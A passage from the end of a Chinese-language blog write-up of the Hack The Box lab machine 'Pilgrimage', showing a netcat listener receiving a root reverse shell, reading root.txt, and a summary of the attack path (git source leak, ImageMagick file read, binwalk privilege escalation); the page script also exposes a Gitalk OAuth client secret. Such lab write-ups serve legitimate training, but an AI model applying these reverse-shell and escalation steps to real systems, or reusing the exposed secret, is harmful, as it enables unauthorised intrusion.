plaintext">┌──(kali㉿kali)-[~/HTB/Pilgrimage]<br>└─$ nc -nlvp 443<br>listening on [any] 443 ...<br>connect to [10.10.14.64] from (UNKNOWN) [10.10.11.219] 60606<br>whoami<br>root<br>id<br>uid=0(root) gid=0(root) groups=0(root)<br>ls -la<br>total 12<br>drwxr-xr-x 3 root root 4096 Jul 12 17:24 .<br>drwx------ 5 root root 4096 Jun  8 00:10 ..<br>drwxr-xr-x 3 root root 4096 Jul 12 17:24 _exp.png.extracted<br>pwd<br>/root/quarantine<br>cd ..<br>ls -la<br>total 40<br>drwx------  5 root root 4096 Jun  8 00:10 .<br>drwxr-xr-x 18 root root 4096 Jun  8 00:10 ..<br>lrwxrwxrwx  1 root root    9 Feb 10 13:43 .bash_history -&gt; /dev/null<br>-rw-r--r--  1 root root  571 Apr 11  2021 .bashrc<br>drwxr-xr-x  3 root root 4096 Jun  8 00:10 .config<br>-rw-r--r--  1 root root   93 Jun  7 20:11 .gitconfig<br>drwxr-xr-x  3 root root 4096 Jun  8 00:10 .local<br>-rw-r--r--  1 root root  161 Jul  9  2019 .profile<br>drwxr-xr-x  3 root root 4096 Jul 12 17:24 quarantine<br>-rwxr-xr-x  1 root root  352 Jun  1 19:13 reset.sh<br>-rw-r-----  1 root root   33 Jul 12 15:37 root.txt<br>cat root.txt<br></code></pre></td></tr></table></figure>

<p>拿下。root目录下有root flag。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这台机子主要考察git源代码泄露的信息收集，对应服务漏洞的发现与利用，以及提权部分对可疑文件的分析与提权思路构建。总体来说还是要提高姿势水平，才能轻松应对。</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/07/05/Anonymous_Playground/">[THM]  Anonymous Playground Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="gitalk-sel"></button></div><div id="gitalk"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Dr.T3yT3y</a></h1><div id="description"><p>May the flame guide thee</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap%E6%89%AB%E6%8F%8F"><span class="toc-number">2.1.</span> <span class="toc-text">nmap扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#whatweb"><span class="toc-number">2.2.</span> <span class="toc-text">whatweb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nikto"><span class="toc-number">2.3.</span> <span class="toc-text">nikto</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E6%B8%97%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">web渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E8%AE%BF%E9%97%AE%E7%BD%91%E7%AB%99"><span class="toc-number">3.1.</span> <span class="toc-text">手动访问网站</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#git%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2"><span class="toc-number">3.2.</span> <span class="toc-text">.git源码泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Magick%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.3.</span> <span class="toc-text">Magick任意文件读取漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81PoC"><span class="toc-number">3.3.1.</span> <span class="toc-text">验证PoC</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BB%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">3.3.2.</span> <span class="toc-text">读数据库</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%AB%8B%E8%B6%B3%E7%82%B9"><span class="toc-number">3.4.</span> <span class="toc-text">获取立足点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E6%9D%BF%E6%96%A7"><span class="toc-number">4.1.</span> <span class="toc-text">三板斧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B5%8F%E8%A7%88"><span class="toc-number">4.2.</span> <span class="toc-text">手动浏览</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E6%9E%9A%E4%B8%BE"><span class="toc-number">4.3.</span> <span class="toc-text">自动枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#binwalk%E6%8F%90%E6%9D%83"><span class="toc-number">4.4.</span> <span class="toc-text">binwalk提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plu</a></nobr><wbr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {gitalk = new Gitalk({
 clientID: 'd746fee266fd40784c87',
 clientSecret: '18467221d189fe0e0b51bd234fcd04785a28ab09',
 repo: 'T3yT3y.github.io',
 owner: 'T3yT3y',
 admin: ['T3yT3y'],
 distractionFreeMode: false,
 id: location.pathname
});
if (document.querySelector("#gitalk")) gitalk.render("gitalk");code.findCode();
document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>